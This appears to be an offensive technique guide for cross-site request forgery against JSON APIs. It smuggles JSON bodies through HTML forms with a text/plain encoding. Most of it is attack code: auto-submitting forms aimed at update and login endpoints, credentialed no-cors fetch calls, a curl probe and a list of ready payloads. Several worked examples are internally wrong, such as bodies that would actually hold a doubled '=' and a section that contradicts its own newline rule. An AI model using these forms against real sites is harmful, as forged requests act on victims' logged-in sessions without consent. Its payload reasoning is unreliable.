# JSON body assembly — shipping valid JSON through a form's text/plain encoding

The endpoint wants `application/json`. A cross-origin form can't
send that content-type. The escape: `enctype="text/plain"` ships
the body unencoded — if the app's parser accepts a `text/plain`
request whose body IS JSON, the write lands.

---

## 1. The encoding problem

A form produces `key=value&key=value` for urlencoded — the `=` and
`&` are structural. For `text/plain`, the browser ships the body
literally as `name1=value1\r\nname2=value2\r\n` — one `name=value`
per line, `=` NOT percent-encoded. To make that parse as JSON, the
`=` must land INSIDE a JSON string, not between keys.

## 2. The canonical trick — a dummy key absorbs the `=`

```html
<form id="f" action="https://target/update" method="POST" enctype="text/plain">
  <input name='{"machine_id":"host-1051","ignore":"' value='"}'>
</form>
<script>document.getElementById('f').submit()</script>
```

The body the browser sends:

```
{"machine_id":"host-1051","ignore":"="}
```

- The input's `name` carries `{"machine_id":"host-1051","ignore":"`
- The form joins `name` + `=` + `value` → the `=` lands inside the
  `"ignore":"..."` string
- The input's `value` `}` closes the JSON
- `"ignore"` is a throwaway key the app (hopefully) ignores

Result: a `text/plain` body that parses as valid JSON.

## 3. The multi-pair shape — split across several inputs

Each input contributes one `name=value` line — each `=` needs a
home inside a string:

```html
<form action="https://target/update" method="POST" enctype="text/plain">
  <input name='{"a":"1","b":"' value='2","c":"3","i":"'>
  <input name='","d":"' value='4"}'>
</form>
```

Body:

```
{"a":"1","b":"=2","c":"3","i":"
=","d":"=4"}
```

Messy — each `=` forces a junk value. For several fields, split so
each `=` falls inside a throwaway string:

```html
<!-- every input's name opens a string that its own = closes inside -->
<input name='{"a":"' value='x","b":"'>
<input name='","i1":"' value='","c":"y","i2":"'>
<input name='","i3":"' value='"}'>
```

Body:

```
{"a":"=x","b":"
=","i1":"=","c":"y","i2":"
=","i3":"="}
```

The values `x`/`y` land where wanted; the `i*` keys carry the `=`s.
The app must ignore unknown keys — check the bind model.

## 4. The strict-vs-lenient bind problem

Whether `"ignore"` keys break the request depends on the JSON bind:

| Bind behavior | Extra keys |
|---|---|
| Go `ShouldBindJSON` / strict `BindJSON` | unknown fields ignored by default; `DisallowUnknownFields` rejects — the TornadoService card used `ShouldBindJSON` which tolerates |
| Go `DisallowUnknownFields()` | unknown field → error — dummy keys fail; restructure so the `=` lands inside a REAL field's value |
| Python `json.loads` | extra keys always fine — dict just has them |
| JS `JSON.parse` | extra keys fine |
| Jackson `@JsonIgnoreProperties(ignoreUnknown=true)` | fine; without it, fails |
| Rails `JSON.parse` | fine; but `permit()` strong-params filters them anyway |

When unknown keys are rejected, hide the `=` inside a REAL field:

```html
<!-- the = lands inside the value of a real field 'q' -->
<input name='{"q":"search' value='=term","page":1}'>
<!-- body: {"q":"search=term","page":1} — the = is INSIDE q's value -->
```

The `=` becomes part of `q`'s string value — no dummy keys needed.
Any field that takes a free-text value can absorb it.

## 5. The `=` inside a real value — the cleanest shape

```html
<form action="https://target/login" method="POST" enctype="text/plain">
  <input name='{"user":"admin","pass":"x' value='=y"}'>
</form>
<!-- body: {"user":"admin","pass":"x=y"} — the = is inside pass's
     value; pass is a real field — no dummy key at all -->
```

Pick a field whose value the app accepts as a free string —
`password`, `q`, `comment`, `data`, `value`, `name` — and let it
carry the `=`. For numeric/bool/array fields, the `=` can't hide
inside — use an adjacent string field or a dummy.

## 6. The non-string field case — numbers, bools, arrays

```json
{"page":1,"admin":true,"tags":["x"]}
```

Numbers/bools can't contain `=`. Assemble so the `=` still lands in
a string:

```html
<input name='{"page":' value='1,"admin":true,"s":"'>
<!-- body: {"page":=1,... — INVALID: the = broke the number -->
```

Instead close the number in the NAME and open a string for the `=`:

```html
<input name='{"page":1,"s":"' value='","admin":true}'>
<!-- body: {"page":1,"s":"=","admin":true} — s carries the = -->
```

Every `=` needs a string to live in; place a `"s":"` before each
form-`=` boundary.

## 7. The newline tolerance — text/plain joins with \r\n

Multiple inputs produce `\r\n`-separated lines — JSON tolerates the
whitespace inside strings? NO — a literal `\r\n` inside a JSON
string is INVALID (unescaped control char). But BETWEEN tokens it's
fine whitespace. So the split must put the line-break between
tokens, not inside a string value... unless the parser is lenient.

```html
<!-- WRONG: the \r\n lands inside a string value -->
<input name='{"a":"x' value='y"}'>
<input name='"b":"' value='z"}'>
<!-- body line 2: "b":"=z"} — the \r\n between inputs lands BETWEEN
     the two inputs' text — that's between '}' and '"b"' — safe,
     it's inter-token whitespace -->
```

The `\r\n` sits between the previous input's `value` end and the
next input's `name` start — as long as that boundary is between
JSON tokens (after `}`, `,`, `:`, `[`), it's legal whitespace. Put
every input boundary at a token boundary.

## 8. When text/plain gets rejected — the content-type gate holds

```text
the app does content-type whitelisting BEFORE parsing:
  if (req.headers['content-type'] !== 'application/json') 415
  → text/plain body never reaches the parser — dead
```

The bypass attempts when the gate is lenient:

```text
- a content-type the form CAN send that the parser sniffs:
  some apps parse the body as JSON regardless of the declared type
  (express.json() only on matching type; but a custom bodyParser or
  fastify/Go decoding on body alone may parse it)
- multipart/form-data carrying a JSON PART — a field whose value
  is the JSON string; the app reads fields then JSON-parses one
- urlencoded whose KEY is the whole JSON — 'a=<json>' won't parse,
  but a field the app JSON-decodes after urldecode does
```

## 9. The `application/json` via multipart — when the server joins parts

```html
<form action="https://target/update" method="POST" enctype="multipart/form-data">
  <input name='{"a":"' value='x"}'>
</form>
```

Multipart wraps each field in a part with its own headers — the
body is multipart, not JSON. Only works if the app reads the field
and JSON-parses its VALUE, or concatenates parts. Rare — text/plain
is the reliable carrier.

## 10. The fetch-no-cors JSON attempt — the header gate

```js
fetch('https://target/update', {
  method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'application/json'},   // REFUSED — not
                                               // CORS-safelisted
  body:'{"a":1}'
})
// the browser refuses to set a non-safelisted content-type in
// no-cors mode — text/plain is the ceiling
fetch('https://target/update', {
  method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:'{"a":1,"i":"="}'       // the = again inside a string
})
```

`no-cors` blocks `application/json` — a preflight would be required
for it, and `no-cors` doesn't preflight. `text/plain`/`urlencoded`/
`multipart` are the only settable types; `text/plain` is the JSON
carrier.

## 11. The "the app parses regardless of declared type" shape

```text
fastify.addContentTypeParser('*', parseJSON)
express: app.use(bodyParser.json({type:'*/*'}))
Go: decoder reads body, ignores Content-Type header
Flask: request.get_json(force=True)
Rails: parses on body sniff
```

A `type:'*/*'` or force-parse or body-sniff accepts the text/plain
JSON — the content-type gate is decorative. The probe: send the
JSON body with `Content-Type: text/plain` and see if it parses.

```bash
curl -i -X POST "$BASE/update" -H 'Content-Type: text/plain' \
  --data '{"a":1,"i":"="}'
```

## 12. The corpus of assembled bodies

```html
<!-- a single-field JSON write -->
<input name='{"name":"' value='csrf-marker"}'>
<!-- {"name":"csrf-marker"} — wait, no = needed? the name has no =,
     but the form adds ONE = between name and value:
     {"name":"=csrf-marker"} — the = lands inside the value -->

<!-- a marker + id write -->
<input name='{"machine_id":"host-1","tag":"' value='csrf"}'>
<!-- {"machine_id":"host-1","tag":"=csrf"} — = inside tag's value -->

<!-- a two-field write, = absorbed by a real string field -->
<input name='{"user":"admin","pass":"x' value='=y"}'>
<!-- {"user":"admin","pass":"x=y"} -->

<!-- three fields, dummy keys carry the =s -->
<input name='{"a":"1","i":"' value='","b":"2","j":"'>
<input name='","k":"' value='","c":"3"}'>
<!-- {"a":"1","i":"=","b":"2","j":"\r\n=","k":"=","c":"3"} -->
```

## 13. The falsifier

```text
the app whitelists content-type to application/json AND rejects
before parsing, AND no multipart/urlencoded carrier reaches a JSON
parse — a cross-origin form cannot produce the required content-
type. class closed for the JSON endpoint; pivot to a urlencoded
write or a different class.
```

## 14. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "json-asm: text/plain form, = inside a real field value"
```
